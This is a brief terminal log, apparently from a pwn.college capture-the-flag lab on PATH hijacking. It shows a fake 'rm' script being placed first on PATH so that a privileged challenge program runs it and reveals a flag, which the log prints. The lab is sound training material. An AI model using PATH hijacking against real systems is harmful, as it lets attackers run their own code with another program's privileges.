# HIJACKING COMMAND
``` bash
bash
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ chmod +x rm
hacker@path~hijacking-commands:~$ export PATH=/home/hacker:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
rm hijacked!
hacker@path~hijacking-commands:~$ nano rm
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
rm has been hijacked
pwn.college{0GtVZIB9M-Bgw6pfVkQ8reuZL_r.ddzNyUDL5AjN0czW}


```
